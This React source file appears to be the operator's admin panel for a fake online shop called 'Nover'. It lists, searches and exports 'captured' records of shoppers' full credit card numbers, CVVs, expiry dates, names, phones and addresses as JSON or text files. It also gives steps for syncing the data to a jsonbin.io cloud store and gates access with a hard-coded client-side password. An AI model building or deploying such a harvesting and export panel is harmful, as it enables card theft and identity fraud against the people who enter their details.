import { useState, useEffect, useCallback } from 'react';
import { CaptureRecord } from '../types';
import { fetchCaptures, clearCaptures, deleteCapture, useCloud } from '../utils/cloudStorage';

export default function AdminPage() {
  const [captures, setCaptures] = useState<CaptureRecord[]>([]);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [passwordRequired, setPasswordRequired] = useState(true);
  const [password, setPassword] = useState('');
  const [passwordError, setPasswordError] = useState(false);
  const [loading, setLoading] = useState(false);

  const loadData = useCallback(async () => {
    setLoading(true);
    try {
      const data = await fetchCaptures();
      setCaptures(data);
    } catch (e) {
      console.error('Failed to load captures:', e);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadData();
  }, [loadData]);

  const handlePasswordSubmit = () => {
    if (password === 'nover-admin') {
      setPasswordRequired(false);
      setPasswordError(false);
    } else {
      setPasswordError(true);
    }
  };

  const filtered = captures.filter(c => {
    if (!searchTerm) return true;
    const term = searchTerm.toLowerCase();
    return (
      c.firstName.toLowerCase().includes(term) ||
      c.lastName.toLowerCase().includes(term) ||
      c.email.toLowerCase().includes(term) ||
      c.shippingCity.toLowerCase().includes(term) ||
      c.shippingState.toLowerCase().includes(term) ||
      c.shippingZip.includes(term) ||
      c.productName.toLowerCase().includes(term) ||
      c.color.toLowerCase().includes(term)
    );
  });

  const exportJSON = () => {
    const blob = new Blob([JSON.stringify(captures, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `nover-data-${new Date().toISOString().split('T')[0]}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const exportText = () => {
    let text = `NOVER CAPTURED DATA — Exported: ${new Date().toLocaleString()}\n`;
    text += `${'='.repeat(80)}\n\n`;

    captures.forEach((c, idx) => {
      text += `RECORD #${idx + 1} — ${new Date(c.timestamp).toLocaleString()}\n`;
      text += `${'-'.repeat(60)}\n\n`;

      text += `  PRODUCT SELECTION\n`;
      text += `    Product:     ${c.productName}\n`;
      text += `    Color:       ${c.color}\n`;
      text += `    Storage:     ${c.storage}\n`;
      text += `    Price:       $${c.price.toFixed(2)}\n\n`;

      text += `  VERIFICATION ADDRESS (ALL INFO)\n`;
      text += `    Name:        ${c.firstName} ${c.lastName}\n`;
      text += `    Email:       ${c.email}\n`;
      text += `    Phone:       ${c.phone}\n`;
      text += `    Address:     ${c.shippingAddress}\n`;
      if (c.shippingApartment) text += `    Apt/Suite:   ${c.shippingApartment}\n`;
      text += `    City:        ${c.shippingCity}\n`;
      text += `    State:       ${c.shippingState}\n`;
      text += `    ZIP:         ${c.shippingZip}\n`;
      text += `    Country:     ${c.shippingCountry}\n\n`;

      text += `  PAYMENT DETAILS (CREDIT CARD, BILLING ADDRESS, ALL INFO)\n`;
      text += `    Card Type:   ${c.cardType}\n`;
      text += `    Card Number: ${c.cardFullNumber}\n`;
      text += `    Last 4:      **** ${c.cardNumberLast4}\n`;
      text += `    Expiry:      ${c.cardExpiry}\n`;
      text += `    CVV:         ${c.cardCVV}\n`;
      text += `    Card Name:   ${c.cardName}\n\n`;

      text += `  BILLING ADDRESS\n`;
      text += `    Address:     ${c.billingAddress}\n`;
      if (c.billingApartment) text += `    Apt/Suite:   ${c.billingApartment}\n`;
      text += `    City:        ${c.billingCity}\n`;
      text += `    State:       ${c.billingState}\n`;
      text += `    ZIP:         ${c.billingZip}\n`;
      text += `    Country:     ${c.billingCountry}\n`;
      text += `\n${'='.repeat(80)}\n\n`;
    });

    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `nover-data-${new Date().toISOString().split('T')[0]}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const handleDelete = async (id: string) => {
    await deleteCapture(id);
    setCaptures(prev => prev.filter(c => c.id !== id));
    if (expandedId === id) setExpandedId(null);
  };

  const handleClearAll = async () => {
    if (window.confirm('Delete ALL records? This cannot be undone.')) {
      await clearCaptures();
      setCaptures([]);
      setExpandedId(null);
    }
  };

  // ---- PASSWORD GATE ----
  if (passwordRequired) {
    return (
      <div className="min-h-screen bg-zinc-950 text-white pt-24 pb-12 px-4 sm:px-6 flex items-center justify-center">
        <div className="max-w-sm w-full text-center">
          <div className="w-16 h-16 mx-auto rounded-full bg-zinc-800 flex items-center justify-center text-2xl mb-6">🔒</div>
          <h2 className="text-xl font-bold mb-2">Admin Access Required</h2>
          <p className="text-zinc-500 text-sm mb-6">Enter the admin password to view captured data.</p>
          <input
            type="password"
            value={password}
            onChange={e => { setPassword(e.target.value); setPasswordError(false); }}
            onKeyDown={e => e.key === 'Enter' && handlePasswordSubmit()}
            className={`w-full px-4 py-3 rounded-xl bg-zinc-800/50 border text-center text-white placeholder-zinc-600 focus:outline-none focus:ring-2 focus:ring-amber-400/50 mb-3 text-sm ${
              passwordError ? 'border-red-500' : 'border-zinc-700/50'
            }`}
            placeholder="Password"
            autoFocus
          />
          {passwordError && <p className="text-red-400 text-xs mb-3">Incorrect password</p>}
          <button
            onClick={handlePasswordSubmit}
            className="w-full py-3 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 text-black font-bold text-sm hover:from-amber-400 hover:to-orange-400 transition-all"
          >
            Access Admin
          </button>
        </div>
      </div>
    );
  }

  // ---- ADMIN PANEL ----
  return (
    <div className="min-h-screen bg-zinc-950 text-white pt-20 pb-12 px-4 sm:px-6">
      <div className="max-w-4xl mx-auto">

        {/* Cloud status banner */}
        {!useCloud && (
          <div className="mb-6 p-4 rounded-xl bg-amber-500/5 border border-amber-500/20">
            <div className="flex items-start gap-3">
              <span className="text-xl mt-0.5">⚠️</span>
              <div>
                <h3 className="text-amber-400 font-semibold text-sm mb-1">Cloud Storage Not Configured</h3>
                <p className="text-zinc-400 text-xs leading-relaxed mb-3">
                  Data is stored in this browser only. To view submissions from any device, set up cloud storage.
                </p>
                <details className="text-zinc-500 text-xs">
                  <summary className="cursor-pointer text-amber-400 font-medium mb-2">How to set up cloud storage (2 minutes):</summary>
                  <ol className="list-decimal list-inside space-y-1 mt-2 text-zinc-400">
                    <li>Go to <span className="text-white font-mono">jsonbin.io</span> and create a free account</li>
                    <li>Click "Create Bin" — save any empty JSON like <span className="text-white font-mono">{"{}"}</span></li>
                    <li>Copy your <span className="text-white">Bin ID</span> from the bin page</li>
                    <li>Go to API Keys → copy your <span className="text-white">Master Key</span></li>
                    <li>Open <span className="text-white font-mono">src/config/storage.ts</span> and paste both values</li>
                    <li>Rebuild the project — done! Data now syncs across all devices.</li>
                  </ol>
                </details>
              </div>
            </div>
          </div>
        )}

        {useCloud && (
          <div className="mb-6 p-3 rounded-xl bg-emerald-500/5 border border-emerald-500/20 flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
            <span className="text-emerald-400 text-xs font-medium">Cloud storage active — data synced across all devices</span>
          </div>
        )}

        {/* Header */}
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between mb-8 gap-4">
          <div>
            <h1 className="text-2xl sm:text-3xl font-black text-white">Admin Panel</h1>
            <p className="text-zinc-500 text-sm mt-1">
              {loading ? 'Loading...' : `${captures.length} record${captures.length !== 1 ? 's' : ''} captured`}
            </p>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={loadData}
              disabled={loading}
              className="px-4 py-2 rounded-lg bg-zinc-800 border border-zinc-700 text-zinc-300 text-xs font-medium hover:bg-zinc-700 transition-colors disabled:opacity-50"
            >
              🔄 Refresh
            </button>
            <button
              onClick={exportJSON}
              disabled={captures.length === 0}
              className="px-4 py-2 rounded-lg bg-zinc-800 border border-zinc-700 text-zinc-300 text-xs font-medium hover:bg-zinc-700 transition-colors disabled:opacity-30 disabled:cursor-not-allowed"
            >
              📥 Export JSON
            </button>
            <button
              onClick={exportText}
              disabled={captures.length === 0}
              className="px-4 py-2 rounded-lg bg-zinc-800 border border-zinc-700 text-zinc-300 text-xs font-medium hover:bg-zinc-700 transition-colors disabled:opacity-30 disabled:cursor-not-allowed"
            >
              📄 Export TXT
            </button>
            {captures.length > 0 && (
              <button
                onClick={handleClearAll}
                className="px-4 py-2 rounded-lg bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-medium hover:bg-red-500/20 transition-colors"
              >
                🗑 Clear All
              </button>
            )}
          </div>
        </div>

        {/* Search */}
        <div className="mb-6">
          <input
            type="text"
            value={searchTerm}
            onChange={e => setSearchTerm(e.target.value)}
            className="w-full px-4 py-3 rounded-xl bg-zinc-800/50 border border-zinc-700/50 text-white placeholder-zinc-600 focus:outline-none focus:ring-2 focus:ring-amber-400/50 transition-all text-sm"
            placeholder="Search by name, email, city, state, ZIP..."
          />
        </div>

        {/* Records */}
        {loading ? (
          <div className="flex items-center justify-center py-20">
            <div className="w-8 h-8 border-3 border-amber-400 border-t-transparent rounded-full animate-spin" />
          </div>
        ) : captures.length === 0 ? (
          <div className="text-center py-20">
            <div className="text-5xl mb-4">📋</div>
            <h3 className="text-lg font-bold text-zinc-400 mb-2">No Records Yet</h3>
            <p className="text-zinc-600 text-sm">Completed orders will appear here.</p>
          </div>
        ) : filtered.length === 0 ? (
          <div className="text-center py-12">
            <p className="text-zinc-500 text-sm">No matches for "{searchTerm}"</p>
          </div>
        ) : (
          <div className="space-y-3">
            {filtered.map((capture) => (
              <div key={capture.id} className="bg-zinc-900/50 border border-zinc-800/50 rounded-xl overflow-hidden">
                <button
                  onClick={() => setExpandedId(expandedId === capture.id ? null : capture.id)}
                  className="w-full px-4 sm:px-6 py-4 flex items-center justify-between text-left hover:bg-zinc-800/20 transition-colors"
                >
                  <div className="flex items-center gap-3 sm:gap-4 min-w-0">
                    <div className="w-10 h-10 rounded-lg bg-amber-500/10 flex items-center justify-center text-sm font-bold text-amber-400 flex-shrink-0">
                      #{captures.indexOf(capture) + 1}
                    </div>
                    <div className="min-w-0">
                      <p className="text-sm font-bold text-white truncate">
                        {capture.firstName} {capture.lastName}
                      </p>
                      <p className="text-xs text-zinc-500 truncate">
                        {capture.email} · {capture.shippingCity}, {capture.shippingState}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-3 flex-shrink-0">
                    <div className="text-right hidden sm:block">
                      <p className="text-sm font-bold text-amber-400">${capture.price.toFixed(2)}</p>
                      <p className="text-xs text-zinc-600">
                        {capture.productName}
                      </p>
                    </div>
                    <span className="text-zinc-600 text-lg transition-transform duration-200" style={{ transform: expandedId === capture.id ? 'rotate(180deg)' : '' }}>
                      ‹
                    </span>
                  </div>
                </button>

                {expandedId === capture.id && (
                  <div className="px-4 sm:px-6 pb-6 border-t border-zinc-800/50">
                    <div className="pt-4 space-y-6">
                      {/* Product */}
                      <div>
                        <h4 className="text-xs font-bold text-amber-400 uppercase tracking-wider mb-2">Product Selection</h4>
                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-sm">
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Product</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.productName}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Color</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.color}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Storage</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.storage}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Price</p>
                            <p className="text-amber-400 font-bold text-xs mt-0.5">${capture.price.toFixed(2)}</p>
                          </div>
                        </div>
                      </div>

                      {/* Verification Address */}
                      <div>
                        <h4 className="text-xs font-bold text-green-400 uppercase tracking-wider mb-2">Verification Address (All Info)</h4>
                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-sm">
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Full Name</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.firstName} {capture.lastName}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Email</p>
                            <p className="text-white font-medium text-xs mt-0.5 break-all">{capture.email}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Phone</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.phone}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Timestamp</p>
                            <p className="text-white font-medium text-xs mt-0.5">{new Date(capture.timestamp).toLocaleString()}</p>
                          </div>
                        </div>
                        <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 text-sm mt-2">
                          <div className="bg-zinc-800/30 rounded-lg p-2.5 sm:col-span-2">
                            <p className="text-zinc-500 text-xs">Street Address</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingAddress}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Apt/Suite</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingApartment || '—'}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">City</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingCity}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">State</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingState}</p>
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-2 mt-2 text-sm">
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">ZIP Code</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingZip}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Country</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingCountry}</p>
                          </div>
                        </div>
                      </div>

                      {/* Payment Details */}
                      <div>
                        <h4 className="text-xs font-bold text-blue-400 uppercase tracking-wider mb-2">Payment Details (Credit Card, Billing Address, All Info)</h4>
                        <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 text-sm">
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Card Type</p>
                            <p className="text-white font-medium text-xs mt-0.5 capitalize">{capture.cardType}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5 sm:col-span-2">
                            <p className="text-zinc-500 text-xs">Card Number</p>
                            <p className="text-white font-mono font-medium text-xs mt-0.5">{capture.cardFullNumber}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Last 4</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.cardNumberLast4}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Expiry</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.cardExpiry}</p>
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-2 mt-2 text-sm">
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">CVV</p>
                            <p className="text-white font-mono font-medium text-xs mt-0.5">{capture.cardCVV}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Card Name</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.cardName}</p>
                          </div>
                        </div>
                      </div>

                      {/* Billing Address */}
                      <div>
                        <h4 className="text-xs font-bold text-blue-400 uppercase tracking-wider mb-2">Billing Address</h4>
                        <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 text-sm">
                          <div className="bg-zinc-800/30 rounded-lg p-2.5 sm:col-span-2">
                            <p className="text-zinc-500 text-xs">Street Address</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingAddress}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Apt/Suite</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingApartment || '—'}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">City</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingCity}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">State</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingState}</p>
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-2 mt-2 text-sm">
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">ZIP Code</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingZip}</p>
                          </div>
                          <div className="bg-zinc-800/30 rounded-lg p-2.5">
                            <p className="text-zinc-500 text-xs">Country</p>
                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingCountry}</p>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="flex items-center justify-between mt-6 pt-4 border-t border-zinc-800/50">
                      <p className="text-zinc-600 text-xs font-mono">{capture.id}</p>
                      <button
                        onClick={() => handleDelete(capture.id)}
                        className="px-3 py-1.5 rounded-lg bg-red-500/10 border border-red-500/20 text-red-400 text-xs hover:bg-red-500/20 transition-colors"
                      >
                        Delete
                      </button>
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
